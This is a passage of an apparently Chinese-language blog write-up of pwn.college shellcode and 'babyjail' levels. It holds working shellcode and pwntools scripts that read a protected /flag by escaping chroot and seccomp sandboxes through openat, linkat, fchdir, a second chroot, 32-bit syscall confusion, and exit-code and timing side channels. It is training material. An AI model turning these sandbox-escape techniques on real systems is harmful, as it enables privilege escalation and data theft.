92<br>syscall # chown(const char *pathname, uid_t owner, gid_t group)<br></code></pre></div></td></tr></table></figure></blockquote><p>13.同上, 而且变成0xc字节, 看来只能chown或者chmod了, 这里用chmod.</p><ul><li><p>?????好吧应该push到栈上, 然后再mov rsp, 这样子才能大幅度地减少字节长度.</p><p>而且由于是小端法存储, 自然地就有7个空字符在0x66后面.<br>gdb一看rax是put函数的返回值, 直接就是0. 这点挺重要: <strong>利用可预测的寄存器的值</strong> </p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">push byte ptr &#x27;f&#x27;    ;6a 66 <br>mov rdi, rsp;48 89 e7<br>mov sil, 0x04;40 b6 04<br>mov al, 0x5a;b0 5a <br>syscall    ;0f 05 长度为0xb  <br></code></pre></div></td></tr></table></figure><p>第二种方案是execv, 去执行shell, 不过文件开头要这么写<code>#!/bin/sh -p</code>, -p是防止默认的重置SUID操作. shell里面直接写<code>cat /flag</code>就成了</p><h2 id="9-被动修改"><a href="#9-被动修改" class="headerlink" title="9.被动修改"></a>9.被动修改</h2><blockquote><p>This challenge modified your shellcode by overwriting every other 10 bytes with 0xcc. 0xcc, when interpreted as an<br>instruction is an <code>INT 3</code>, which is an interrupt to call into the debugger. You must avoid these modifications in your<br>shellcode.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">s1 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    /* chmod(file=&#x27;/flag&#x27;, mode=&#x27;S_IROTH&#x27;) */</span><br><span class="hljs-string">    lea edi, [rip+0x22]</span><br><span class="hljs-string">    jmp done</span><br><span class="hljs-string">    .space 12</span><br><span class="hljs-string">done:</span><br><span class="hljs-string">    mov sil, 0x04 /* S_IROTH == 0x04 */</span><br><span class="hljs-string">    /* call chmod() */</span><br><span class="hljs-string">    mov al, 0x5a</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    .skip 13</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>payload = asm(s1) + <span class="hljs-string">b&#x27;/flag\x00&#x27;</span><br></code></pre></div></td></tr></table></figure><h2 id="10-sort-ur-shellcode"><a href="#10-sort-ur-shellcode" class="headerlink" title="10.sort ur shellcode"></a>10.sort ur shellcode</h2><blockquote><p>每8个字节作为一个64位无符号数, 使用冒泡排序升序排列. emmmmmm……</p></blockquote><p>非常刚好的每8字节从小到大排序, 主要的思想就是代码尽量少, 打开文件和读写放到另外一个文件中(c写的读文件), execve会继承父进程权限.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x632f2e</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor edx, edx /* 0 */</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-comment">#   0:   68 2e 2f 61 00          push   0x612f2e</span><br><span class="hljs-comment">#   5:   48 89 e7                mov    rdi, rsp</span><br><span class="hljs-comment">#   8:   31 d2                   xor    edx, edx</span><br><span class="hljs-comment">#   a:   31 f6                   xor    esi, esi</span><br><span class="hljs-comment">#   c:   6a 3b                   push   0x3b</span><br><span class="hljs-comment">#   e:   58                      pop    rax</span><br><span class="hljs-comment">#   f:   0f 05                   syscall</span><br></code></pre></div></td></tr></table></figure><p>11.同上, 关闭stdin</p><blockquote><p>上一题仍然继续用.</p></blockquote><h2 id="12-每个byte得unique"><a href="#12-每个byte得unique" class="headerlink" title="12.每个byte得unique"></a>12.每个byte得unique</h2><blockquote><p><code>ascii_values = [ord(character) for character in text]</code>python字符串=&gt;ASCII</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push 0x632f2e</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor esi, esi /* 0 */</span><br><span class="hljs-string">    lea edx, [esi] /* 0 */</span><br><span class="hljs-string">    /* call execve() */</span><br><span class="hljs-string">    push SYS_execve /* 0x3b */</span><br><span class="hljs-string">    pop rax</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></div></td></tr></table></figure><p>出乎意料的简单, 只要把第二个xor改成lea指令去清空edx就可以了. 一开始改的mov还不行.</p><h2 id="14-只读6个字节"><a href="#14-只读6个字节" class="headerlink" title="14.只读6个字节"></a>14.只读6个字节</h2><blockquote><p>好像只能2-stage shellcode, emmmmmmmm…….</p></blockquote><p>仍然是利用了rax等于0, rdx是shellmem地址, 也可以当做是要读取的字节数使用read函数的话只有rsi(第二个参数)需要改为rdx上的地址, 简单mov就可以了. 然后第二阶段随便整.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">xor edi, edi</span><br><span class="hljs-string">mov esi, edx</span><br><span class="hljs-string">syscall//call read(0, 0x14e40000, 0x14e40000)</span><br><span class="hljs-string">//2-stage shellcode</span><br><span class="hljs-string">.space 6, 0x90</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode += shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>)<br>shellcode += shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br>shellcode += shellcraft.amd64.write(<span class="hljs-number">1</span>,    <span class="hljs-number">0x14e40000</span>+<span class="hljs-number">0x100</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/home/hacker/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br></code></pre></div></td></tr></table></figure><h1 id="module-5-jail"><a href="#module-5-jail" class="headerlink" title="module 5-jail"></a>module 5-jail</h1><ul><li><p>chroot(“/tmp/jail”)</p><ul><li><p>chroot(“/tmp/jail”) does NOT:</p><p>Close resources that reside outside of the jail.<br>cd (chdir()) into the jail.<br>Do anything else!</p></li><li><p>you can use open<strong>at</strong> and execve<strong>at</strong>: <code>int openat(**int dirfd**, char *pathname, int flags);</code></p><p>这两个函数的path如果是绝对路径, 那么dirfd就会被忽略;<br>如果path是相对路径, 而且dirfd是合法的, 那么path所引用的就是dirfd所表示的路径.</p></li><li><p>如果再次chroot会发生什么? kernel对此是完全不知情的.</p></li><li><p>Generally, a user with an effective ID of 0 (i.e., a process run as root or SUIDed to root) can <em><strong>always</strong></em> break out of a chroot, unless the chroot syscall is blocked!</p></li><li><p>Also missing other forms of isolation: <strong>PID, network, IPC</strong> </p></li><li><p>Replacements: <strong>cgroups, namespaces, seccomp</strong> </p></li></ul></li><li><p>seccomp: </p><ul><li><code>gcc -o test test.c -lseccomp</code> <code>seccomp-tools dump ./test</code> </li><li>原理是eBPF, seccomp就是使用的eBPF来实现的, 还可以用来实现一系列system trace <a href="https://github.com/iovisor/bcc">tools</a> </li></ul></li><li><p>break out seccomp: Generally, to do anything useful, a sandboxed process needs to be able to communicate with the privileged process. 有两点可能, 第一是syscall很多, 有些可能可以被利用, 第二是开发者可能为了不破坏功能而在权限方面犯错误.</p><ul><li><strong>permissive policies</strong>: ptrace() sendmsg() prctl() process_vm_writev()</li><li><strong>syscall confusion:</strong> on some systems, you can switch between 32-bit mode with 64-bit mode <em>in the same process</em>, and the syscall numbers are different between architectures. 比如说系统调用分别是<code>int 0x80 and syscall</code>(<code>\xcd\x80 and \x0f\x05</code>), 系统调用号也不同.</li><li><strong>kernel vulnerabilities</strong> in the syscall handlers: Over 30 chrome sandbox escapes in 2019 <a href="https://github.com/allpaca/chrome-sbx-db">link</a> </li><li>data exfiltration: such as sleep(), exit(), normal or crash. Or use DNS queries to bypass network egress filters.</li></ul></li></ul><blockquote><p>Redirections很重要. <a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html">link</a> </p></blockquote><p>补充:</p><ul><li>实际测试中在shell里面直接使用chroot命令并不会发生escape, 只能在c代码中使用chroot库函数. 猜测可能是因为chroot的命令行对系统调用进行了一层封装, 加上了跳转到jail里面的目录中; 而libc库中只是单纯的系统调用, 并没有chdir这个步骤.</li><li>好几个函数都有<code>at</code>的版本, chmod-&gt;fchmodat, open-&gt;openat(open只是libc中对openat的封装) and so forth.</li><li></li></ul><h3 id="1-exemplify"><a href="#1-exemplify" class="headerlink" title="1.exemplify"></a>1.exemplify</h3><p>相当简单, 直接利用程序中chroot后没有切换到jail里面的特点, 更改cwd为真正的根目录, 第一个参数填写为flag, 最后open的时候由于flag是相对地址, 会以真正的根目录作为基准来定位true flag.</p><h3 id="2-同第一题"><a href="#2-同第一题" class="headerlink" title="2.同第一题"></a>2.同第一题</h3><blockquote><p>第一个参数不能含有flag字符串, 是为了禁止直接打开flag文件. 在这个challenge中还可以注入shellcode, </p></blockquote><p>也没什么难的, 只要在shellcode里面打开‘flag’然后写到stdin里面就可以了.</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = glob(<span class="hljs-string">&quot;/challenge/baby*[0-9]&quot;</span>)[<span class="hljs-number">0</span>]<br>context.binary = binary<br>p = process([binary, <span class="hljs-string">b&#x27;abc&#x27;</span>]) <span class="hljs-comment">#不能直接打开flag文件</span><br><br>shellcode = shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;O_RDWR&#x27;</span>)<br>shellcode+= <span class="hljs-string">&#x27;lea r8, [rip]\nadd r8, 0x100&#x27;</span><span class="hljs-comment">#写到buf上, 估计很快就不行了.</span><br>shellcode+= shellcraft.amd64.read(<span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>shellcode+= shellcraft.amd64.write(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x40</span>)<br><br>payload = asm(shellcode)<br>payload += <span class="hljs-string">b&#x27;\x0f\x04&#x27;</span><span class="hljs-comment"># 随手加个非法指令,遇到SIGILL就知道shellcode肯定是执行完了.</span><br>p.sendline(payload)<br><br>p.interactive()<br></code></pre></div></td></tr></table></figure><h3 id="3-move-in"><a href="#3-move-in" class="headerlink" title="3.move in"></a>3.move in</h3><p>参数不能含有flag子串, 打开文件时有O_NOFOLLOW标志, 软连接无效,  而且在chdir之前只有一个open.<br>也不能在命令行里打开flag, 包括符号链接. 要跳出chroot也许只剩下再次chroot. 好像也不行, 看了看视频应该要用openat.<br>在kali上试试chroot. openat成功了.</p><ul><li>directory stream file descriptor和file descriptor不是同一个东西, 具体资料待查. openat只能用dirfd.</li><li>命令行里打出<code>./chroot flag 6&lt;.</code>即可, 会打开当前文件夹且dirfd=6.</li><li><strong>也可以直接打开fd=3, 这个是命令行第一个参数, 而且在chroot前被打开, 可以被openat使用.</strong> </li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/&quot;</span>+os.uname().nodename<br>context.binary = binary<br><br>shellcode = shellcraft.amd64.openat(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>) <br>shellcode += shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;rax&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>) <br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/home/hacker/input&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(payload)<br></code></pre></div></td></tr></table></figure><h3 id="4-seccomped-gt-openat"><a href="#4-seccomped-gt-openat" class="headerlink" title="4.seccomped -&gt; openat"></a>4.seccomped -&gt; openat</h3><blockquote><p>每一题的要求都在逐渐增加. 这一题仍然可以用openat, 没有变化.</p></blockquote><h3 id="5-linkat"><a href="#5-linkat" class="headerlink" title="5. linkat"></a>5. linkat</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.linkat(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;AT_FDCWD&quot;</span>, <span class="hljs-string">&#x27;/f&#x27;</span>, <span class="hljs-number">0</span>)<br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure><h3 id="6-fchdir"><a href="#6-fchdir" class="headerlink" title="6.fchdir"></a>6.fchdir</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.fchdir(<span class="hljs-number">6</span>)                       <br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure><h3 id="7-没有at了"><a href="#7-没有at了" class="headerlink" title="7.没有at了"></a>7.没有at了</h3><p>允许的syscall:</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">chdir</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">80</span>).<br>chroot (<span class="hljs-keyword">number</span> <span class="hljs-number">161</span>).<br><span class="hljs-built_in">mkdir</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">83</span>).<br><span class="hljs-keyword">open</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">2</span>).<br><span class="hljs-keyword">read</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">0</span>).<br><span class="hljs-keyword">write</span> (<span class="hljs-keyword">number</span> <span class="hljs-number">1</span>).<br>sendfile (<span class="hljs-keyword">number</span> <span class="hljs-number">40</span>).<br></code></pre></div></td></tr></table></figure><p>使用再次chroot:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">shellcode = shellcraft.amd64.mkdir(<span class="hljs-string">&quot;/temp&quot;</span>, <span class="hljs-number">0o777</span>)<br>shellcode+= shellcraft.amd64.chroot(<span class="hljs-string">&quot;/temp&quot;</span>)             <br>shellcode+= shellcraft.amd64.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;../../flag&quot;</span>, <span class="hljs-string">&quot;O_RDWR&quot;</span>)<br>shellcode+= shellcraft.amd64.sendfile(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;rax&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">128</span>)<br></code></pre></div></td></tr></table></figure><h3 id="8-openat-read-write-send"><a href="#8-openat-read-write-send" class="headerlink" title="8.openat read write send"></a>8.openat read write send</h3><p>感觉没什么特别的. 参数已经不限制输入flag了. 直接使用第三题的东西.</p><h3 id="9-变成32位"><a href="#9-变成32位" class="headerlink" title="9.变成32位"></a>9.变成32位</h3><p>syscall no: 3,4,5,6: <strong>close, stat, fstat, lstat.</strong> ???????????</p><p>哦对, 程序里的seccomp是通过SCMP_SYS() macro来add rule的, 然后又把arch设置成x86_32, 这样的话就是32位的read write open close这四个系统调用了. 而且没有chroot.</p><p>尝试使用pwntools遇到各种各样的问题.</p><ul><li>64和32代码是怎么切换的? int 0x80 and syscall吗?</li><li>int 0x80在64位模式下汇编, push最多DWORD. 不然operand mismatch.</li><li>字符串的地址只能使用汇编中的label, 栈上的地址仍然是64位的, 可能是因为过长导致open不能使用.</li><li>64位汇编肯定就不能用SYS_read这种了, 只能改成数字. </li></ul><p>精简如下(也没多精简):</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">/* open(file=&#x27;/flag&#x27;, oflag=&#x27;O_RDWR&#x27;, mode=0) */<br>/* push b&#x27;/flag\x00&#x27; */<br>lea ebx, [rip+flag]<br>mov ecx, 0x2<br>xor edx, edx<br>/* call open() */<br>mov eax, 5<br>int 0x80<br>/* read(fd=&#x27;eax&#x27;, buf=0x1337100, nbytes=0x99) */<br>mov ebx, eax<br>mov ecx, 0x1337100<br>mov rdx, 0x99<br>/* call read() */                               <br>push 3/* 3 */<br>pop rax<br>int 0x80<br>/* write(fd=1, buf=0x1337100, n=0x32) */<br>mov ebx, 0x1<br>mov ecx, 0x1337100<br>mov rdx, 0x99<br>/* call write() */<br>mov eax, 4<br>int 0x80<br><br>flag:<br>    .ascii &quot;/flag&quot;<br>    .byte 0 #加不加没有区别, map上去的地址空间都是零<br></code></pre></div></td></tr></table></figure><h3 id="10-side-channel-communication"><a href="#10-side-channel-communication" class="headerlink" title="10.side channel communication"></a>10.side channel communication</h3><blockquote><p>都没有chroot了. 这题使用exit每次返回一字节.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> glob <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/babyjail_level10&quot;</span><br>context.binary = binary<br><br>ans = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    shellcode =  <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100&#x27;</span><br>    shellcode += shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)<br>    shellcode += <span class="hljs-string">&#x27;mov r10, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\n&#x27;</span><br>    shellcode += shellcraft.amd64.exit(<span class="hljs-string">&#x27;r10&#x27;</span>)<br>    payload = asm(shellcode)<br>    p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>    p.sendline(payload)<br>    exitCode = p.poll(<span class="hljs-number">1</span>)<br>    ans += <span class="hljs-built_in">chr</span>(exitCode)<br>    i += <span class="hljs-number">1</span><br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure><h3 id="11-nanosleep"><a href="#11-nanosleep" class="headerlink" title="11.nanosleep"></a>11.nanosleep</h3><blockquote><p>这下子真的是bitwise的收集数据了</p></blockquote><p>遇到的几个问题:</p><ul><li>偶然会发生broken tube, 不知原因.</li><li>可以用字符串的format函数. </li><li>在pwn.college机子上timespec结构体两个成员都是<strong>八字节(包括long)</strong> </li><li>被网上抄来的32位程序nasm坑了一把, 现在是64位gas, 基本全改了……….</li><li>setnz是思维导图里看到突然想起来能用的. 以前整得笔记还不错.</li><li>直接使用label地址会有重定位条目, 必须使用rip来加上标签的偏移来在运行时确定准确的地址.</li><li>加载地址请用lea……line 15卡了十几分钟…..</li><li>视频中演示了time命令, 计算程序运行时间.</li><li>也可以直接写在栈上, 不用在汇编里写上这么一个数据结构.</li><li>如果把时间范围调大一点也能用时间来表示ascii码值, 也就是一次一字节. 应该更快.</li><li>视频使用了一个pwn.log.progress和process参数level, 这样子就不会有一堆打开关闭命令了.</li></ul><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/bin/python</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>binary = <span class="hljs-string">&quot;/challenge/&quot;</span>+os.uname().nodename<br>context.binary = binary<br><br>bck1 = <span class="hljs-string">&#x27;mov r8, rdx\nmov r9, r8\nadd r8, 0x100\n&#x27;</span>+shellcraft.amd64.read(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;r8&#x27;</span>, <span class="hljs-number">0x100</span>)+<span class="hljs-string">&#x27;xor rcx, rcx\n&#x27;</span><br>bck2 = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    setnz cl</span><br><span class="hljs-string">    sal ecx, 4</span><br><span class="hljs-string">    mov [rip+tv_usec+3], cl</span><br><span class="hljs-string">    mov rax, 35</span><br><span class="hljs-string">    lea rdi, [rip+timeval]</span><br><span class="hljs-string">    mov rsi, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    //经典非法指令,至少让我知道shellcode执行正常</span><br><span class="hljs-string">    .ascii &quot;\x0f\x04&quot; </span><br><span class="hljs-string">    timeval:</span><br><span class="hljs-string">    tv_sec:  .8byte 0</span><br><span class="hljs-string">    tv_usec: .8byte 0</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>ans = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">60</span>):<br>    char = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        sc = bck1 <span class="hljs-comment">#这个就是对read的一个封装</span><br>        <span class="hljs-comment">#下面这个是取出一字节, 然后测试第j位是否为1</span><br>        sc += <span class="hljs-string">&#x27;mov cl, [r8+&#x27;</span>+<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&#x27;]\ntest cl,&#x27;</span>+<span class="hljs-built_in">hex</span>(<span class="hljs-number">1</span>&lt;&lt;j)+<span class="hljs-string">&#x27;\n&#x27;</span><br>        sc += bck2<br><span class="hljs-comment">#上面这个是nanosleep的调用封装,秒数由j位移位赋值到timespec结构体中第二个成员的第四个字节</span><br><span class="hljs-comment">#(从最低位开始, 因为是小端法存储),结果是268,435,456(1 0000|00000000|00000000|00000000)ns</span><br><span class="hljs-comment">#无sleep大概是0.05s,所以分界点为0.2s</span><br>        payload = asm(sc)<br>        start = time.time()<br>        p = process([binary, <span class="hljs-string">&#x27;/flag&#x27;</span>])<br>        p.sendline(payload)<br>        p.wait()<br>        end = time.time()<br>        elapse = end - start<br>        <span class="hljs-keyword">if</span> elapse &gt; <span class="hljs-number">0.2</span>:<br>            char |= <span class="hljs-number">1</span>&lt;&lt;j<br>    <span class="hljs-comment">#end for bits loop</span><br>    ans += <span class="hljs-built_in">chr</span>(char)<br><br><span class="hljs-built_in">print</span>(ans)<br></code></pre></div></td></tr></table></figure><h3 id="12-only-read"><a href="#12-only-read" class="headerlink" title="12.only read"></a>12.only read</h3><p>这次换成crash code就行了. <code>-4 </code>is 